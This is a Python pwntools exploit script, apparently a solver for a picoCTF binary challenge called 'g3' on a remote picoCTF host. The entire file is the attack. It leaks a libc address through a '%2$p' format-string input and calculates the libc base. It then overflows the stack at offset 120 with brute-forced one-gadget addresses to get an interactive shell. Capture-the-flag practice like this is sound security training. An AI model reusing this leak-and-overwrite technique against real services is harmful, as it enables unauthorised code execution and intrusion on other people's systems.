from pwn import *

exe = context.binary = ELF("./g3", checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so') 


HOST = "wily-courier.picoctf.net"
PORT = 60402

def main():
    for f in range(1000,1500) :
        if args.LOCAL :
            io =process("./g3")
        else :
            io = remote(HOST, PORT)
        off =0x7f1397f1f8d0 - 0x7f1397b81420
        io.sendline(b"%2$p")
        line = io.recvline()
        line = line.strip()
        leaked = int(line, 16)
        leaked_system = leaked - off
        base = leaked_system - libc.sym.system
        libc.address = base
        print(f"leaked libc address @ {hex(leaked)}")
        print(f"printf address @ {hex(leaked_system)}")
        print(f"libc base calculated @ {hex(libc.address)}")

        gadget = libc.address + 0x4f000 + f  

        payload = fit({120: p64(gadget)})
        io.sendline(payload)
        io.interactive()
        

if __name__ == "__main__":
    main()
